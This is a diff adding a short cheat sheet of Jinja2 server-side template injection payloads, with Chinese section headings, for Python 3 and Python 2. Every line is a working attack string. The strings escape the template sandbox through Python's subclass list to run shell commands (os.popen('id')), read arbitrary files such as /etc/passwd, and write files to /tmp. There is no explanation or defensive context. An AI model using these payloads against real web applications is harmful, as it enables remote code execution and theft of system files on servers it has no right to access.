@@ -1,0 +1,10 @@
+1.payload: #命令执行：  py3
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
+#文件操作
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+
+Py2
+#读文件：
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+#写文件：
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
